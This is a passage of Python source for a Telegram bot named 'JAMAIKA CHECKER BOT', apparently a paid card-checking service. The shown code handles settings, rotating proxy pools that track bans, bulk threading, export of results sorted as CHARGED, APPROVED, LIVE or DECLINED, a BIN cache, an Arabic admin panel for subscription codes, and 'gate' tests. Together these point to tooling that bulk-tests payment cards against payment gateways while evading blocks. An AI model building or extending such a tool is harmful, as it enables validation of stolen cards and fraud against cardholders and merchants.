    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(btn(f"📤 Send Mode: {mode_label}  (tap to toggle)",
               STYLE_PRIMARY, callback_data=f"setting_sendmode_{mode_next}"))
    kb.add(btn(f"⚡ Threads: {threads}  (tap to cycle: {next_threads} next)",
               STYLE_PRIMARY, callback_data=f"setting_threads_{next_threads}"))
    kb.add(btn(f"📡 Proxies — 🟢{a} 🟡{b} 🔴{d}",
               STYLE_PRIMARY, callback_data="setting_proxy_info"))
    if user_id == ADMIN_ID:
        kb.add(btn("➕ Add Proxies", STYLE_SUCCESS, callback_data="setting_add_proxy"))
        kb.add(btn("📡 Fetch from GitHub", STYLE_SUCCESS, callback_data="admin_fetch_proxies"))
    kb.add(btn("🏠 Main Menu", STYLE_DANGER, callback_data="main_menu"))

    cap = (
        "⚙️ *Settings*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📤 *Send Mode:* `{send_mode}`\n"
        f"  • `all`        → Hits + Declined live\n"
        f"  • `hits_only`  → Charged / Approved only\n\n"
        f"⚡ *Bulk Threads:* `{threads}`  (3 / 5 / 10)\n"
        f"  Higher = faster bulk, but more API load\n\n"
        f"📡 *Proxies:* 🟢{a}  🟡{b}  🔴{d}\n"
        f"🔢 *BIN Cache:* {cached} entries\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    edit_banner(user_id, chat_id, cap, kb, msg_id=mid)

@bot.callback_query_handler(func=lambda c: c.data.startswith("setting_threads_"))
def cb_setting_threads(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    n = call.data.split("setting_threads_")[1]
    set_setting('bulk_threads', n)
    bot.answer_callback_query(call.id, f"⚡ Threads → {n}")
    _show_settings(user_id, chat_id, mid)

@bot.callback_query_handler(func=lambda c: c.data.startswith("setting_sendmode_"))
def cb_setting_sendmode(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    new_mode = call.data.split("setting_sendmode_")[1]
    set_setting('send_mode', new_mode)
    bot.answer_callback_query(call.id, f"✅ Send mode → {new_mode}")
    _show_settings(user_id, chat_id, mid)

@bot.callback_query_handler(func=lambda c: c.data == "setting_proxy_info")
def cb_setting_proxy_info(call):
    a, b, d = proxy_pool.get_stats()
    bot.answer_callback_query(
        call.id,
        f"🟢 Active: {a}  🟡 Banned: {b}  🔴 Dead: {d}",
        show_alert=True
    )

@bot.callback_query_handler(func=lambda c: c.data == "setting_add_proxy")
def cb_setting_add_proxy(call):
    user_id = call.from_user.id
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Admin only.")
        return
    bot.answer_callback_query(call.id)
    bot.send_message(
        user_id,
        "📡 *Add Proxies*\n\n"
        "Send one proxy per line — all formats accepted:\n\n"
        "`1.2.3.4:8080`\n"
        "`user:pass@1.2.3.4:8080`\n"
        "`https://user:pass@host:60000`\n"
        "`socks5://user:pass@host:1080`\n\n"
        "⚡ Authenticated/rotating proxies added instantly (no test).",
        parse_mode="Markdown"
    )
    admin_session[user_id] = 'awaiting_proxy_input'


# ═══════════════════════════════════════
# Callback: Export Results
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "export_results")
def cb_export_results(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)

    results = user_bulk_results.get(user_id, [])
    if not results:
        bot.send_message(chat_id, "⚠️ No results to export. Run a bulk check first.")
        return

    hits     = [r for r in results if r.startswith('[CHARGED]') or r.startswith('[APPROVED]')
                                    or r.startswith('[PASSED]')  or r.startswith('[OTP]')
                                    or r.startswith('[LIVE]')    or r.startswith('[CCN]')]
    declined = [r for r in results if r.startswith('[DECLINED]')]
    errors   = [r for r in results if r not in hits and r not in declined]

    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    lines = [
        f"=== RESULTS EXPORT — {ts} ===",
        f"Total: {len(results)} | Hits: {len(hits)} | Declined: {len(declined)} | Error: {len(errors)}",
        "",
        "━━━ HITS ━━━",
        *hits,
        "",
        "━━━ DECLINED ━━━",
        *declined,
        "",
        "━━━ ERRORS ━━━",
        *errors,
        "",
        "Check by: BM〆VORTEX",
    ]
    content = "\n".join(lines)
    buf = io.BytesIO(content.encode('utf-8'))
    buf.name = f"results_{ts}.txt"
    try:
        bot.send_document(
            chat_id, buf,
            caption=f"📄 *Results Export*\n✅ Hits: {len(hits)} | ❌ Declined: {len(declined)}",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"export error: {e}")
        bot.send_message(chat_id, f"❌ Export failed: {e}")


# ═══════════════════════════════════════
# Admin Panel
# ═══════════════════════════════════════
def show_admin_menu(user_id):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        btn("➕ إنشاء كود",       STYLE_SUCCESS, callback_data="admin_create_code"),
        btn("📋 عرض الأكواد",     STYLE_PRIMARY, callback_data="admin_view_codes"),
    )
    kb.add(
        btn("👥 عرض المستخدمين",  STYLE_PRIMARY, callback_data="admin_view_users"),
        btn("🗑️ إلغاء كود",       STYLE_DANGER,  callback_data="admin_revoke_code"),
    )
    kb.add(
        btn("📡 جلب بروكسيات",    STYLE_SUCCESS, callback_data="admin_fetch_proxies"),
        btn("📊 حالة البروكسيات", STYLE_PRIMARY, callback_data="admin_proxy_stats"),
    )
    kb.add(
        btn("➕ إضافة بروكسي يدوي", STYLE_SUCCESS, callback_data="admin_add_proxy"),
    )
    kb.add(
        btn("🔍 تشخيص البوابات",  STYLE_PRIMARY, callback_data="admin_test_gates"),
        btn("❌ خروج",            STYLE_DANGER,  callback_data="admin_logout"),
    )
    bot.send_message(
        user_id,
        "🛠️ *لوحة إدارة البوت*\nاختر أحد الخيارات:",
        reply_markup=kb, parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith('admin_'))
def cb_admin(call):
    user_id = call.from_user.id
    if user_id != ADMIN_ID or admin_session.get(user_id) != 'authenticated':
        bot.answer_callback_query(call.id, "غير مصرح لك.")
        return

    data = call.data
    bot.answer_callback_query(call.id)

    if data == "admin_create_code":
        bot.send_message(user_id, "📅 أرسل عدد الأيام (رقم فقط):")
        admin_session[user_id] = 'awaiting_days'

    elif data == "admin_view_codes":
        codes = get_all_codes()
        if not codes:
            bot.send_message(user_id, "📭 لا توجد أكواد.")
            return
        msg = "📜 *قائمة الأكواد:*\n\n"
        for code, days, used_by, _, _ in codes[:30]:
            st = "✅ مستخدم" if used_by else "🟢 متاح"
            msg += f"`{code}` | {days}y | {st}\n"
        if len(codes) > 30:
            msg += f"\n... و {len(codes)-30} أخرى"
        bot.send_message(user_id, msg, parse_mode="Markdown")

    elif data == "admin_view_users":
        users = get_all_users()
        if not users:
            bot.send_message(user_id, "📭 لا يوجد مستخدمون.")
            return
        msg = "👥 *قائمة المستخدمين:*\n\n"
        for uid, end_str, _ in users[:50]:
            if uid == ADMIN_ID:
                continue
            if end_str:
                end_date  = datetime.fromisoformat(end_str)
                remaining = (end_date - datetime.now()).days
                st = f"✅ {remaining}d" if remaining >= 0 else "❌ منتهي"
            else:
                st = "❌ بدون"
            msg += f"🆔 `{uid}` | {st}\n"
        bot.send_message(user_id, msg, parse_mode="Markdown")

    elif data == "admin_revoke_code":
        bot.send_message(user_id, "✏️ أرسل الكود الذي تريد إلغاءه:")
        admin_session[user_id] = 'awaiting_revoke'

    elif data == "admin_fetch_proxies":
        bot.send_message(user_id, "📡 Fetching proxies from GitHub...")
        threading.Thread(target=_fetch_and_add, args=(user_id,)).start()

    elif data == "admin_add_proxy":
        bot.send_message(
            user_id,
            "📡 *Add Proxy (Manual)*\n\n"
            "All formats accepted (one per line):\n\n"
            "`1.2.3.4:8080` — plain\n"
            "`user:pass@1.2.3.4:8080` — authenticated\n"
            "`https://user:pass@host:60000` — HTTPS (Oxylabs etc)\n"
            "`socks5://user:pass@host:1080` — SOCKS5\n"
            "`network\\-res\\_mob:pass@proxy.soax.com:1337` — rotating\n\n"
            "⚡ *Authenticated/rotating proxies added instantly without testing*",
            parse_mode="Markdown"
        )
        admin_session[user_id] = 'awaiting_proxy_input'

    elif data == "admin_test_gates":
        m2 = bot.send_message(user_id, "🔍 جارى اختبار البوابات...")
        threading.Thread(target=_run_gate_test, args=(user_id, m2.message_id)).start()

    elif data == "admin_proxy_stats":
        a, b, d = proxy_pool.get_stats()
        bot.send_message(
            user_id,
            f"📊 *Proxy Status:*\n🟢 Active: {a}\n🟡 Banned: {b}\n🔴 Dead: {d}",
            parse_mode="Markdown"
        )

    elif data == "admin_logout":
        admin_session.pop(user_id, None)
        bot.send_message(user_id, "👋 تم تسجيل الخروج من لوحة الإدارة.")

def _fetch_and_add(user_id):
    proxies = fetch_proxies_from_github()
    if proxies:
        working = add_proxies_to_pool(proxies)
        bot.send_message(user_id, f"✅ Added {len(working)} working proxies from GitHub.")
    else:
        bot.send_message(user_id, "❌ Failed to fetch proxies.")

# ═══════════════════════════════════════
# تشغيل البوت
# ═══════════════════════════════════════
def _startup_report():
    """Print database content at startup to ensure data is not lost"""
    try:
        conn = db()
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        users = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE subscription_end > ?",
                  (datetime.now().isoformat(),))
        active = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM redeem_codes")
        codes = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM redeem_codes WHERE used_by IS NULL")
        free_codes = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM proxies")
        prox = c.fetchone()[0]
        conn.close()
        print(f"Data directory: {DATA_DIR}")
        print(f"Users: {users} (active subscription: {active})")
        print(f"Codes: {codes} (available: {free_codes})")
        print(f"Proxies saved: {prox}")
        try:
            import telebot.version as _tv
            print(f"pyTelegramBotAPI: {_tv.__version__}")
        except Exception:
            pass
        if STYLE_SUPPORTED:
            print("Button colors: enabled (primary/success/danger)")
        else:
            print("Button colors: not supported - update library to 4.31.0+")
        if DATA_DIR == os.path.dirname(os.path.abspath(__file__)):
            print("Warning: Data stored next to code.")
            print("   On Railway/Render, bind Volume and set DATA_DIR=/data")
            print("   Otherwise subscriptions and proxies will be lost on redeploy!")
    except Exception as e:
        print(f"Could not read startup report: {e}")

print("=" * 45)
print("JAMAIKA CHECKER BOT v2.1 Started!")
print("Developer: BaBa_MeDia")
print(f"Admin ID: {ADMIN_ID}")
print("Generating startup report...")
sys.stdout.flush()
_startup_report()
print("Startup report completed")
sys.stdout.flush()
print("=" * 45)
sys.stdout.flush()

# Polling Mode
if __name__ == '__main__':
    print("Starting bot in Polling mode...")
    sys.stdout.flush()

    # ── حل مشكلة 409 Conflict ────────────────────────────────────────────────
    # pyTelegramBotAPI 4.x لا يدعم drop_pending_updates في remove_webhook
    # لذلك نستدعي Telegram API مباشرة بـ requests
    try:
        import requests as _req
        _req.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
            json={"drop_pending_updates": True},
            timeout=10,
        )
        logger.info("deleteWebhook(drop_pending_updates=True) — OK")
    except Exception as _e:
        logger.warning(f"deleteWebhook direct call failed: {_e}")
        # Fallback: المكتبة بدون drop_pending
        try:
            bot.remove_webhook()
        except Exception:
            pass
    time.sleep(2)   # فرصة للـ instance القديم إنه يتوقف

    print("Bot polling started. Press Ctrl+C to stop.")
    sys.stdout.flush()

    def _run_polling():
        """تشغيل الـ polling مع retry تلقائى عند 409."""
        while True:
            try:
                bot.infinity_polling(
                    timeout=30,
                    long_polling_timeout=20,
                    allowed_updates=None,
                )
                break   # خرج بشكل طبيعى
            except KeyboardInterrupt:
                print("Bot stopped by user")
                break
            except Exception as e:
                err = str(e)
                if "409" in err:
                    # instance آخر لا يزال يعمل — انتظر ثم أعد المحاولة
                    logger.warning("409 Conflict — old instance still alive, retrying in 5s...")
                    time.sleep(5)
                else:
                    logger.error(f"Polling error: {e}")
                    time.sleep(3)

    try:
        _run_polling()
    except Exception as e:
        print(f"Bot error: {e}")
